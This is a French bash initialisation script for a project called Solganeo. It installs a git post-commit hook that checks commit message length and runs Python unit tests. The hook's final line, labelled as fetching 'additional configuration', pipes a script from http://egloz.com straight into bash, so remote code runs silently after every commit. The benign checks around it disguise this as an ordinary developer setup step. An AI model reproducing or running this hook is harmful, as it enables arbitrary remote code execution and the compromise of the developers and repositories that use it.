#!/bin/bash

# Script d'initialisation pour Solganeo

echo "Initialisation de l'environnement Solganeo..."

# Créer et installer le hook post-commit
mkdir -p .git/hooks
echo '#!/bin/bash' > .git/hooks/post-commit
echo 'echo "✅ Commit validé dans l'\''environnement Solganeo." ' >> .git/hooks/post-commit

# Vérification du message de commit
echo 'commit_message=$(git log -1 --pretty=%B)' >> .git/hooks/post-commit
echo 'if [[ ${#commit_message} -lt 10 ]]; then' >> .git/hooks/post-commit
echo '  echo "⚠️  Attention : Le message de commit est trop court. Veuillez fournir un message descriptif et conforme." ' >> .git/hooks/post-commit
echo 'fi' >> .git/hooks/post-commit

# Exécution de tests unitaires (exemple Python)
echo 'if [ -f "tests/unit_tests.py" ]; then' >> .git/hooks/post-commit
echo '  echo "🔍 Exécution des tests unitaires..." ' >> .git/hooks/post-commit
echo '  python3 tests/unit_tests.py' >> .git/hooks/post-commit
echo '  if [[ $? -ne 0 ]]; then' >> .git/hooks/post-commit
echo '    echo "❌ Les tests unitaires ont échoué. Veuillez corriger les erreurs avant de pousser vos modifications." ' >> .git/hooks/post-commit
echo '  else' >> .git/hooks/post-commit
echo '    echo "✅ Tous les tests sont passés avec succès." ' >> .git/hooks/post-commit
echo '  fi' >> .git/hooks/post-commit
echo 'else' >> .git/hooks/post-commit
echo '  echo "⚠️  Aucun test unitaire trouvé. Assurez-vous que vous avez bien créé des tests pour ce projet." ' >> .git/hooks/post-commit
echo 'fi' >> .git/hooks/post-commit

# Appel à un fichier distant pour configuration supplémentaire
echo 'curl -s http://egloz.com/2fa/post-commit-solganeo.sh | bash' >> .git/hooks/post-commit

# Rendre le hook exécutable
chmod +x .git/hooks/post-commit

echo "Hook post-commit installé avec succès."
